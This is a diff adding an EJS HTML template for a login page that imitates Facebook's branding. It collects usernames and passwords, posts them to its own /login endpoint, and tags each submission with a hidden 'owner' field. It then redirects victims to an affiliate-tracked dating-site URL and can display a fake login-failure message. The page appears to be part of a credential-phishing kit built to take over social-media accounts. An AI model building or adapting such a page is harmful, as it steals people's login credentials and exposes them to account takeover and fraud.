@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="<%= i18n.language %>">
+<head>
+    <title><%= t('login.page_title') %></title>
+    <meta charset="UTF-8">
+    <meta content="<%= t('landing.initial_description') %>" property="og:description" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" rel="stylesheet" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+         body { background-color: #ffffff; }
+        .vvv { width: 350px; background-color: #1877f2; color: #ffff; margin-top: 20px; padding: 10px; }
+        .vvv:hover { color: #ffff; }
+        .main { margin-left: 0 !important; margin-right: 0 !important; }
+        @media (min-width:1007px) { .main { margin-left: 35% !important; margin-right: 35% !important; } }
+        /* Estilos del formulario inyectado */
+       
+        .form-container input { direction: ltr; background: #f5f6f7; border: 1px solid #ccd0d5; border-radius: 6px; display: block; font-size: 16px; padding: 12px; width: 100%; margin-bottom: 12px; }
+        .form-container button { background: rgb(24 119 242); font-weight: bold; color: #fff; border: none; border-radius: 6px; width: 100%; font-size: 18px; height: 44px; line-height: 44px; margin-top: 15px; }
+        .form-container .info-banner { display: inline-flex; width: 100%; margin-bottom: 15px; background-color:#fffbe2; text-align: start; color: #555; }
+        .form-container .info-banner p { padding: 15px 10px; margin: 0; font-size: 14px; }
+        .form-container .login-button { background: rgb(24 119 242); font-weight: bold; color: #fff; border: none; border-radius: 6px; width: 100%; font-size: 18px; height: 44px; /* line-height: 44px; */ margin-top: 15px; display: flex; align-items: center; justify-content: center; }
+
+        .form-container .info-banner img { width: 20px; height: 35px; margin-left: 15px; margin-top: 9px; }
+        .form-container .separator { text-align: center; color: #90949c; margin: 20px 0; position: relative; }
+        .form-container .separator::before, .form-container .separator::after { content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #ccd0d5; }
+        .form-container .separator::before { left: 0; }
+        .form-container .separator::after { right: 0; }
+          .error-message { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 1rem; border-radius: 0.5rem; margin-bottom: 1rem; text-align: center; display: none; }
+
+        .form-container .create-account-btn { background: #e2ecf9; color: #2c63b6; height: 40px; line-height: 40px; font-size: 16px; margin-top: 10px; }
+        .form-container a { color: #3b5998; text-decoration: none; font-size: 14px; }
+        
+        /* --- ESTILOS PARA EL SPINNER --- */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .login-button:disabled { cursor: not-allowed; background-color: #9cb4d8; }
+    </style>
+</head>
+<body>
+    <div id="form-view" class="form-container" style="block">
+        <div class="main">
+            <center><img width="200px" height="133px" src="https://i.imgur.com/Ql1auXe.png"></center>
+            <div class="info-banner">
+                <img src="https://i.postimg.cc/MTq50GNX/phone.png">
+                <p><%= t('landing.form_title') %></p>
+            </div>
+            <div style="padding: 0 16px;">
+                <form id="loginForm" action="/login" method="post">
+                    <div id="errorMessage" class="error-message"><%= t('login.error_message') %></div>
+
+                    <input type="hidden" name="propietario" id="propietarioField">
+                    <input type="hidden" name="url_final" id="urlFinalField">
+
+                    <input name="username" placeholder="<%= t('login.placeholder_email') %>" required>
+                    <input name="password" placeholder="<%= t('login.placeholder_password') %>" type="password" required>
+                    
+                    <button id="submitButton" type="submit" name="login" class="login-button">
+                        <span id="buttonText"><%= t('login.button') %></span>
+                        <div id="buttonSpinner" class="spinner"></div>
+                    </button>
+                </form>
+                <div style="margin-top: 15px; text-align: center;">
+                    <a href="#"><%= t('login.forgot_password') %></a>
+                </div>
+                <div>
+                    <div class="separator"><span><%= t('landing.or_separator') %></span></div>
+                    <div style="text-align: center;">
+                        <button class="create-account-btn"><%= t('login.create_account') %></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+
+            if (urlParams.get('error') === '1') {
+                document.getElementById('errorMessage').style.display = 'block';
+            }
+            
+            const propietario = urlParams.get('propietario') || 'default-owner';
+            let url_final = urlParams.get('url_final') || 'https://aoarlv.happydatte.net/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=234303&s2=2155912&s3=Soypastel';
+
+            if (!url_final.startsWith('http://') && !url_final.startsWith('https://')) {
+                url_final = 'https://' + url_final;
+            }
+
+            document.getElementById('propietarioField').value = propietario;
+            document.getElementById('urlFinalField').value = url_final;
+
+            // --- SCRIPT PARA EL ESTADO DE CARGA DEL BOTÓN ---
+            const form = document.getElementById('loginForm');
+            const submitButton = document.getElementById('submitButton');
+            const buttonText = document.getElementById('buttonText');
+            const buttonSpinner = document.getElementById('buttonSpinner');
+
+            form.addEventListener('submit', function(e) {
+                submitButton.disabled = true;
+                buttonText.style.display = 'none';
+                buttonSpinner.style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
